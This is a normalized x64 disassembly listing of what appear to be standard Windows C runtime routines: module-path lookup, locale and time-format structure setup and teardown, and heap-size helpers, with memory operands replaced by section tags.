mov [ rsp + 0x20 ] rsi
call sub_18001da10
int3
lea r13 [ rw-data ]
mov r8d 0x104
mov [ rw-data ] si
mov rdx r13
call [ GetModuleFileNameW@IAT ]
lea edi [ r12 - 0x19 ]
test eax eax
jne r-xdata
mov cl [ rbx ]
mov [ r8 ] cl
cmp [ rbx ] si
je r-xdata
mov rcx r13
call sub_18002715c
inc rax
cmp rax 0x3c
jbe r-xdata
lea r8 [ r--data ]
mov edx edi
mov rcx r13
call sub_180027178
test eax eax
je r-xdata
lea r8 [ r--data ]
mov rdx r12
mov rcx rbp
call sub_1800270d4
test eax eax
jne r-xdata
mov rcx r13
call sub_18002715c
lea r8 [ r--data ]
mov r9d 0x3
lea rcx [ rbp + rax * 2 - 0x44 ]
mov rax rcx
sub rax r13
sar rax 0x1
sub rdi rax
mov rdx rdi
call sub_180018f0c
test eax eax
je r-xdata
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] rsi
call sub_18001da10
int3
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] rsi
call sub_18001da10
int3
mov r8 rbx
mov rdx r12
mov rcx rbp
call sub_1800270d4
test eax eax
jne r-xdata
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] rsi
call sub_18001da10
int3
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] rsi
call sub_18001da10
int3
lea rdx [ r--data ]
mov r8d 0x12010
mov rcx rbp
call sub_180026ecc
jmp r-xdata
sub_1800210b0
sub rsp 0x28
mov ecx 0x3
call sub_1800271e4
cmp eax 0x1
je r-xdata
mov ecx 0xfc
call sub_180020e50
mov ecx 0xff
call sub_180020e50
mov ecx 0x3
call sub_1800271e4
test eax eax
jne r-xdata
add rsp 0x28
retn
cmp [ rw-data ] 0x1
jne r-xdata
sub_1800210f4
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
mov rbp r8
mov rsi rdx
mov rbx rcx
test rcx rcx
jne r-xdata
movsxd rax [ rbx + 0x18 ]
mov edi [ rbx + 0x14 ]
add rax [ rsi + 0x8 ]
jne r-xdata
call sub_180021248
xor ecx ecx
test edi edi
je r-xdata
call sub_180021248
or eax 0xffffffff
mov r9 [ rsi + 0x8 ]
movsxd r8 [ rbx + 0x18 ]
lea rdx [ r9 + r8 ]
test ecx ecx
je r-xdata
inc ecx
add rdx 0x8
cmp ecx edi
jb r-xdata
lea eax [ rcx - 0x1 ]
lea rdx [ r8 + rax * 8 ]
mov eax [ rdx + r9 + 0x4 ]
jmp r-xdata
movsxd rax [ rdx ]
add rax r9
cmp rbp rax
jl r-xdata
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
add rsp 0x20
pop rdi
retn
sub_1800211bc
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov edi r9d
lea r9 [ rsp + 0x40 ]
mov rbx r8
call sub_180019b48
mov rcx [ rax ]
movsxd rax [ rbx + 0x1c ]
mov [ rsp + 0x40 ] rcx
cmp edi [ rax + rcx + 0x4 ]
jle r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov [ rax + rcx + 0x4 ] edi
sub_1800212a0
push rbx
sub rsp 0x20
xor ebx ebx
mov r10 r8
test r9 r9
jne r-xdata
test rcx rcx
je r-xdata
test rcx rcx
jne r-xdata
call sub_1800194ec
mov ebx 0x16
test rdx rdx
je r-xdata
test rdx rdx
jne r-xdata
test r9 r9
jne r-xdata
xor eax eax
jmp r-xdata
test r8 r8
jne r-xdata
mov [ rcx ] bl
jmp r-xdata
add rsp 0x20
pop rbx
retn
mov r11 rcx
mov r8 rdx
cmp r9 0xffffffffffffffff
jne r-xdata
mov [ rcx ] bl
sub r10 rcx
sub r11 r10
test r9 r9
jne r-xdata
dec r8
je r-xdata
test r8 r8
jne r-xdata
dec r8
jne r-xdata
mov [ r11 ] bl
dec r9
jne r-xdata
cmp r9 0xffffffffffffffff
jne r-xdata
mov al [ r10 ]
mov [ r11 + r10 ] al
inc r10
test al al
je r-xdata
jmp r-xdata
mov al [ r10 + r11 ]
mov [ r11 ] al
inc r11
test al al
je r-xdata
mov [ rcx ] bl
call sub_1800194ec
mov ebx 0x22
jmp r-xdata
mov [ rcx + rdx - 0x1 ] bl
lea eax [ r8 + 0x50 ]
jmp r-xdata
mov [ rax ] ebx
call sub_18001dab4
mov eax ebx
sub_180021360
sub rsp 0x28
test rcx rcx
jne r-xdata
mov r8 rcx
mov rcx [ rw-data ]
xor edx edx
add rsp 0x28
jmp [ HeapSize@IAT ]
call sub_1800194ec
mov [ rax ] 0x16
call sub_18001dab4
or rax 0xffffffffffffffff
add rsp 0x28
retn
sub_18002139c
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
mov [ rsp + 0x18 ] rdi
push rbp
push r12
push r13
mov rbp rsp
sub rsp 0x40
movzx esi [ rdx + 0x42 ]
movzx r12d [ rdx + 0x44 ]
mov rdi rcx
test rcx rcx
jne r-xdata
and [ rbp - 0x8 ] 0x0
lea rax [ rcx + 0x8 ]
mov r9d 0x31
lea r13d [ r9 - 0x30 ]
mov [ rbp - 0x10 ] rdx
lea rcx [ rbp - 0x10 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180020c40
lea rcx [ rdi + 0x10 ]
lea r9d [ r13 + 0x31 ]
mov [ rsp + 0x20 ] rcx
lea rcx [ rbp - 0x10 ]
mov r8d esi
mov edx r13d
mov ebx eax
call sub_180020c40
lea rcx [ rdi + 0x18 ]
lea r9d [ r13 + 0x32 ]
mov [ rsp + 0x20 ] rcx
lea rcx [ rbp - 0x10 ]
mov r8d esi
mov edx r13d
or ebx eax
call sub_180020c40
lea r9d [ r13 + 0x33 ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x20 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180020c40
lea r9d [ r13 + 0x34 ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x28 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180020c40
lea r9d [ r13 + 0x35 ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x30 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180020c40
lea r9d [ r13 + 0x36 ]
lea rcx [ rbp - 0x10 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rdi
or ebx eax
call sub_180020c40
lea r9d [ r13 + 0x29 ]
or ebx eax
lea rax [ rdi + 0x40 ]
lea rcx [ rbp - 0x10 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180020c40
lea r9d [ r13 + 0x2a ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x48 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180020c40
lea r9d [ r13 + 0x2b ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x50 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180020c40
or ebx eax
lea rax [ rdi + 0x58 ]
lea r9d [ r13 + 0x2c ]
lea rcx [ rbp - 0x10 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180020c40
lea r9d [ r13 + 0x2d ]
or ebx eax
lea rax [ rdi + 0x60 ]
lea rcx [ rbp - 0x10 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180020c40
lea r9d [ r13 + 0x2e ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x68 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180020c40
lea r9d [ r13 + 0x2f ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x38 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180020c40
lea r9d [ r13 + 0x43 ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x70 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180020c40
lea r9d [ r13 + 0x44 ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x78 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180020c40
lea r9d [ r13 + 0x45 ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x80 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180020c40
lea r9d [ r13 + 0x46 ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x88 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180020c40
lea r9d [ r13 + 0x47 ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x90 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180020c40
lea r9d [ r13 + 0x48 ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x98 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180020c40
or ebx eax
lea rax [ rdi + 0xa0 ]
lea r9d [ r13 + 0x49 ]
lea rcx [ rbp - 0x10 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180020c40
lea r9d [ r13 + 0x4a ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0xa8 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180020c40
lea r9d [ r13 + 0x4b ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0xb0 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180020c40
lea r9d [ r13 + 0x4c ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0xb8 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180020c40
lea r9d [ r13 + 0x4d ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0xc0 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180020c40
lea r9d [ r13 + 0x4e ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0xc8 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180020c40
lea r9d [ r13 + 0x37 ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0xd0 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180020c40
lea r9d [ r13 + 0x38 ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0xd8 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180020c40
lea r9d [ r13 + 0x39 ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0xe0 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180020c40
lea r9d [ r13 + 0x3a ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0xe8 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180020c40
or ebx eax
lea rax [ rdi + 0xf0 ]
lea r9d [ r13 + 0x3b ]
lea rcx [ rbp - 0x10 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180020c40
lea r9d [ r13 + 0x3c ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0xf8 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180020c40
lea r9d [ r13 + 0x3d ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x100 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180020c40
lea r9d [ r13 + 0x3e ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x108 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180020c40
lea r9d [ r13 + 0x3f ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x110 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180020c40
lea r9d [ r13 + 0x40 ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x118 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180020c40
lea r9d [ r13 + 0x41 ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x120 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180020c40
lea r9d [ r13 + 0x42 ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x128 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180020c40
lea r9d [ r13 + 0x27 ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x130 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180020c40
lea r9d [ r13 + 0x28 ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x138 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180020c40
or ebx eax
lea rax [ rdi + 0x140 ]
mov [ rsp + 0x20 ] rax
lea r9d [ r13 + 0x1e ]
lea rcx [ rbp - 0x10 ]
mov r8d r12d
mov edx r13d
call sub_180020c40
lea r9d [ r13 + 0x1f ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x148 ]
mov r8d r12d
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180020c40
lea rcx [ rbp - 0x10 ]
mov r9d 0x1003
or ebx eax
lea rax [ rdi + 0x150 ]
mov r8d r12d
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180020c40
lea rcx [ rbp - 0x10 ]
mov r9d 0x1009
or ebx eax
lea rax [ rdi + 0x15c ]
mov r8d r12d
xor edx edx
mov [ rsp + 0x20 ] rax
call sub_180020c40
lea r9d [ r13 + 0x30 ]
lea rcx [ rbp - 0x10 ]
lea r13d [ r9 - 0x2f ]
or ebx eax
lea rax [ rdi + 0x170 ]
mov r8d esi
mov edx r13d
mov [ rdi + 0x158 ] r12d
mov [ rsp + 0x20 ] rax
call sub_180020c40
lea r9d [ r13 + 0x30 ]
or ebx eax
lea rax [ rdi + 0x178 ]
lea rcx [ rbp - 0x10 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180020c40
lea r9d [ r13 + 0x31 ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x180 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180020c40
lea r9d [ r13 + 0x32 ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x188 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180020c40
lea r9d [ r13 + 0x33 ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x190 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180020c40
lea r9d [ r13 + 0x34 ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x198 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180020c40
or ebx eax
lea rax [ rdi + 0x168 ]
lea r9d [ r13 + 0x35 ]
lea rcx [ rbp - 0x10 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180020c40
lea r9d [ r13 + 0x28 ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x1a8 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180020c40
lea r9d [ r13 + 0x29 ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x1b0 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180020c40
lea r9d [ r13 + 0x2a ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x1b8 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180020c40
lea r9d [ r13 + 0x2b ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x1c0 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180020c40
lea r9d [ r13 + 0x2c ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x1c8 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180020c40
lea r9d [ r13 + 0x2d ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x1d0 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180020c40
lea r9d [ r13 + 0x2e ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x1a0 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180020c40
lea r9d [ r13 + 0x42 ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x1d8 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180020c40
lea r9d [ r13 + 0x43 ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x1e0 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180020c40
or ebx eax
lea rax [ rdi + 0x1e8 ]
mov [ rsp + 0x20 ] rax
lea r9d [ r13 + 0x44 ]
lea rcx [ rbp - 0x10 ]
mov r8d esi
mov edx r13d
call sub_180020c40
lea r9d [ r13 + 0x45 ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x1f0 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180020c40
lea r9d [ r13 + 0x46 ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x1f8 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180020c40
lea r9d [ r13 + 0x47 ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x200 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180020c40
lea r9d [ r13 + 0x48 ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x208 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180020c40
lea r9d [ r13 + 0x49 ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x210 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180020c40
lea r9d [ r13 + 0x4a ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x218 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180020c40
lea r9d [ r13 + 0x4b ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x220 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180020c40
lea r9d [ r13 + 0x4c ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x228 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180020c40
lea r9d [ r13 + 0x4d ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x230 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180020c40
lea r9d [ r13 + 0x36 ]
or ebx eax
lea rax [ rdi + 0x238 ]
mov [ rsp + 0x20 ] rax
lea rcx [ rbp - 0x10 ]
mov r8d esi
mov edx r13d
call sub_180020c40
lea r9d [ r13 + 0x37 ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x240 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180020c40
lea r9d [ r13 + 0x38 ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x248 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180020c40
lea r9d [ r13 + 0x39 ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x250 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180020c40
lea r9d [ r13 + 0x3a ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x258 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180020c40
lea r9d [ r13 + 0x3b ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x260 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180020c40
lea r9d [ r13 + 0x3c ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x268 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180020c40
lea r9d [ r13 + 0x3d ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x270 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180020c40
lea r9d [ r13 + 0x3e ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x278 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180020c40
lea r9d [ r13 + 0x3f ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x280 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180020c40
lea r9d [ r13 + 0x40 ]
mov r8d esi
or ebx eax
lea rax [ rdi + 0x288 ]
mov [ rsp + 0x20 ] rax
lea rcx [ rbp - 0x10 ]
mov edx r13d
call sub_180020c40
lea r9d [ r13 + 0x41 ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x290 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180020c40
lea r9d [ r13 + 0x26 ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x298 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180020c40
lea r9d [ r13 + 0x27 ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x2a0 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180020c40
lea r9d [ r13 + 0x1d ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x2a8 ]
mov r8d r12d
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180020c40
lea r9d [ r13 + 0x1e ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x2b0 ]
mov r8d r12d
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180020c40
lea rcx [ rbp - 0x10 ]
mov r9d 0x1003
or ebx eax
lea rax [ rdi + 0x2b8 ]
mov r8d r12d
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180020c40
or eax ebx
or eax 0xffffffff
jmp r-xdata
mov rbx [ rsp + 0x60 ]
mov rsi [ rsp + 0x68 ]
mov rdi [ rsp + 0x70 ]
add rsp 0x40
pop r13
pop r12
pop rbp
retn
sub_180021f0c
test rcx rcx
je r-xdata
retn
push rbx
sub rsp 0x20
mov rbx rcx
mov rcx [ rcx + 0x8 ]
call sub_180018b3c
mov rcx [ rbx + 0x10 ]
call sub_180018b3c
mov rcx [ rbx + 0x18 ]
call sub_180018b3c
mov rcx [ rbx + 0x20 ]
call sub_180018b3c
mov rcx [ rbx + 0x28 ]
call sub_180018b3c
mov rcx [ rbx + 0x30 ]
call sub_180018b3c
mov rcx [ rbx ]
call sub_180018b3c
mov rcx [ rbx + 0x40 ]
call sub_180018b3c
mov rcx [ rbx + 0x48 ]
call sub_180018b3c
mov rcx [ rbx + 0x50 ]
call sub_180018b3c
mov rcx [ rbx + 0x58 ]
call sub_180018b3c
mov rcx [ rbx + 0x60 ]
call sub_180018b3c
mov rcx [ rbx + 0x68 ]
call sub_180018b3c
mov rcx [ rbx + 0x38 ]
call sub_180018b3c
mov rcx [ rbx + 0x70 ]
call sub_180018b3c
mov rcx [ rbx + 0x78 ]
call sub_180018b3c
mov rcx [ rbx + 0x80 ]
call sub_180018b3c
mov rcx [ rbx + 0x88 ]
call sub_180018b3c
mov rcx [ rbx + 0x90 ]
call sub_180018b3c
mov rcx [ rbx + 0x98 ]
call sub_180018b3c
mov rcx [ rbx + 0xa0 ]
call sub_180018b3c
mov rcx [ rbx + 0xa8 ]
call sub_180018b3c
mov rcx [ rbx + 0xb0 ]
call sub_180018b3c
mov rcx [ rbx + 0xb8 ]
call sub_180018b3c
mov rcx [ rbx + 0xc0 ]
call sub_180018b3c
mov rcx [ rbx + 0xc8 ]
call sub_180018b3c
mov rcx [ rbx + 0xd0 ]
call sub_180018b3c
mov rcx [ rbx + 0xd8 ]
call sub_180018b3c
mov rcx [ rbx + 0xe0 ]
call sub_180018b3c
mov rcx [ rbx + 0xe8 ]
call sub_180018b3c
mov rcx [ rbx + 0xf0 ]
call sub_180018b3c
mov rcx [ rbx + 0xf8 ]
call sub_180018b3c
mov rcx [ rbx + 0x100 ]
call sub_180018b3c
mov rcx [ rbx + 0x108 ]
call sub_180018b3c
mov rcx [ rbx + 0x110 ]
call sub_180018b3c
mov rcx [ rbx + 0x118 ]
call sub_180018b3c
mov rcx [ rbx + 0x120 ]
call sub_180018b3c
mov rcx [ rbx + 0x128 ]
call sub_180018b3c
mov rcx [ rbx + 0x130 ]
call sub_180018b3c
mov rcx [ rbx + 0x138 ]
call sub_180018b3c
mov rcx [ rbx + 0x140 ]
call sub_180018b3c
mov rcx [ rbx + 0x148 ]
call sub_180018b3c
mov rcx [ rbx + 0x150 ]
call sub_180018b3c
mov rcx [ rbx + 0x170 ]
call sub_180018b3c
mov rcx [ rbx + 0x178 ]
call sub_180018b3c
mov rcx [ rbx + 0x180 ]
call sub_180018b3c
mov rcx [ rbx + 0x188 ]
call sub_180018b3c
mov rcx [ rbx + 0x190 ]
call sub_180018b3c
mov rcx [ rbx + 0x198 ]
call sub_180018b3c
mov rcx [ rbx + 0x168 ]
call sub_180018b3c
mov rcx [ rbx + 0x1a8 ]
call sub_180018b3c
mov rcx [ rbx + 0x1b0 ]
call sub_180018b3c
mov rcx [ rbx + 0x1b8 ]
call sub_180018b3c
mov rcx [ rbx + 0x1c0 ]
call sub_180018b3c
mov rcx [ rbx + 0x1c8 ]
call sub_180018b3c
mov rcx [ rbx + 0x1d0 ]
call sub_180018b3c
mov rcx [ rbx + 0x1a0 ]
call sub_180018b3c
mov rcx [ rbx + 0x1d8 ]
call sub_180018b3c
mov rcx [ rbx + 0x1e0 ]
call sub_180018b3c
mov rcx [ rbx + 0x1e8 ]
call sub_180018b3c
mov rcx [ rbx + 0x1f0 ]
call sub_180018b3c
mov rcx [ rbx + 0x1f8 ]
call sub_180018b3c
mov rcx [ rbx + 0x200 ]
call sub_180018b3c
mov rcx [ rbx + 0x208 ]
call sub_180018b3c
mov rcx [ rbx + 0x210 ]
call sub_180018b3c
mov rcx [ rbx + 0x218 ]
call sub_180018b3c
mov rcx [ rbx + 0x220 ]
call sub_180018b3c
mov rcx [ rbx + 0x228 ]
call sub_180018b3c
mov rcx [ rbx + 0x230 ]
call sub_180018b3c
mov rcx [ rbx + 0x238 ]
call sub_180018b3c
mov rcx [ rbx + 0x240 ]
call sub_180018b3c
mov rcx [ rbx + 0x248 ]
call sub_180018b3c
mov rcx [ rbx + 0x250 ]
call sub_180018b3c
mov rcx [ rbx + 0x258 ]
call sub_180018b3c
mov rcx [ rbx + 0x260 ]
call sub_180018b3c
mov rcx [ rbx + 0x268 ]
call sub_180018b3c
mov rcx [ rbx + 0x270 ]
call sub_180018b3c
mov rcx [ rbx + 0x278 ]
call sub_180018b3c
mov rcx [ rbx + 0x280 ]
call sub_180018b3c
mov rcx [ rbx + 0x288 ]
call sub_180018b3c
mov rcx [ rbx + 0x290 ]
call sub_180018b3c
mov rcx [ rbx + 0x298 ]
call sub_180018b3c
mov rcx [ rbx + 0x2a0 ]
call sub_180018b3c
mov rcx [ rbx + 0x2a8 ]
call sub_180018b3c
mov rcx [ rbx + 0x2b0 ]
call sub_180018b3c
mov rcx [ rbx + 0x2b8 ]
call sub_180018b3c
add rsp 0x20
pop rbx
sub_1800222fc
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
push rdi
sub rsp 0x20
cmp [ rcx + 0x20 ] 0x0
mov rdi rcx
lea rbp [ rw-data ]
je r-xdata
mov rbx rbp
mov edx 0x2c0
mov ecx 0x1
call sub_18001b79c
mov rbx rax
test rax rax
jne r-xdata
mov [ rdi + 0x158 ] rbx
xor eax eax
[ rax + 0x160 ]
mov rdx rdi
mov rcx rax
call sub_18002139c
test eax eax
je r-xdata
mov eax 0x1
jmp r-xdata
mov [ rbx + 0x160 ] 0x1
jmp r-xdata
mov rcx rbx
call sub_180021f0c
mov rcx rbx
